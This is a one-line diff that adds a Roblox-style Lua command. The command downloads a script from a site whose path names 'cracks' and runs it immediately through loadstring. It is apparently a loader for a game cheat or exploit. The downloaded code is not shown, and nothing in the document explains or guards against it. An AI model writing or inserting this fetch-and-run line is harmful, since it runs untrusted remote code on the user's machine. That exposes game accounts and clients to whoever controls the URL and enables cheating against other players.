@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cracklua.github.io/cracks/wemg"))()
